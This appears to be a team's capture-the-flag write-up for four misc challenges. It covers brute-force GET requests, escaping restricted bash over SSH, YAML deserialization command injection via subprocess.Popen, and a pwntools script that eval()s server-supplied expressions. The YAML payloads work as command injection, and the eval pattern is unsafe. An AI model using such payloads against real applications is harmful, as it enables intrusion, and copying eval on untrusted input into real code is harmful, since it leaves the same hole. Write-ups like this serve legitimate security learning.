# misc

## Persistence
> Solved by Legend

Challenge description


> Thousands of years ago, sending a GET request to /flag would grant immense power and wisdom. Now it's broken and usually returns random data, but keep trying, and you might get lucky... Legends say it works once every 1000 tries.

In this challenge we are given `IP` along with `Port Number`  to connect to the challenge and retrieve the flag using the `GET` request.

Initially checking the URL it gave something gibberish.

![](https://i.imgur.com/Yf7EiWW.png)


The hint of the challenge was that the `/flag` works once in 1000 tries. So I made a loop to do the same.


    for i in `seq 1 1000`; do curl -s http://68.183.45.143:31981/flag | grep -i "HTB" ; done

And after running for sometime it gave the flag.

![](https://i.imgur.com/WbpHGPu.png)

----------

## Restricted
> Solved by Legend

Challenge description


> You 're still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment ?

In this challenge we are given SSH shell escape to get the flag.

Going through the docker file we can get some info of what configuration is done to the challenge

1. The shell is set to `rbash` which basically means restricted bash.


    RUN chown -R restricted:restricted /home/restricted


1. The flag file will have some random value appended to it as written in the config


    RUN mv /flag.txt /flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1`

Since it is a SSH escape challenge I remembered that I have solved a challenge like this before so first thing I did was to check if we can execute remote code without opening the SSH shell.

![](https://i.imgur.com/KAPfFSz.png)


It worked!! So now all I had to do was look for the flag file name as it gets changed and cat it. 

![](https://i.imgur.com/6Tce4Cu.png)


We got the flag.

![](https://i.imgur.com/MQyffnB.png)

----------

## Hijack
> Solved by Starry-Lord


![](https://i.imgur.com/c1ZeYkj.png)


Connect with nc to the docker instance, then create a config and decode the base 64. We can see it gives back YAML syntax so we can try to inject commands with subprocess.Popen:

After base64 encoding it, and using the “Load config” option, This worked!

    !!python/object/apply:subprocess.Popen
    - ls

I had to dig a little more to find how to give arguments to the command:


    !!python/object/apply:subprocess.Popen
    - !!python/tuple
      - ls
      - -la

  
And solved:

```
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - cat
  - flag.txt
```

![](https://i.imgur.com/b0l46TJ.png)

----------

## Remote Computation
> Solved by : thewhiteh4t


    #!/usr/bin/env python3
    
    from pwn import *
    
    host = '188.166.152.84'
    port = 30603
    conn = remote(host, port)
    conn.recvuntil(b'>').decode()
    conn.send(b'1\n')
    
    for x in range(500):
        ques_line = conn.recv().decode()
        ques = ques_line.split(': ')[1].split(' = ?')[0]
        try:
            ans = round(eval(ques), 2)
            if ans < -1337.00 or ans > 1337.00:
                print('Got Memory Error')
                ans = 'MEM_ERR'
        except SyntaxError:
            print('Got Syntax Error')
            ans = 'SYNTAX_ERR'
        except ZeroDivisionError:
            print('Got Zero Error')
            ans = 'DIV0_ERR'
        ans = str(ans).encode()
        conn.sendline(ans)
        print(f'Answered {x} questions')
    
    print(conn.recvuntil(b'}').decode())
    


![](https://i.imgur.com/AVK9rWh.png)

----------

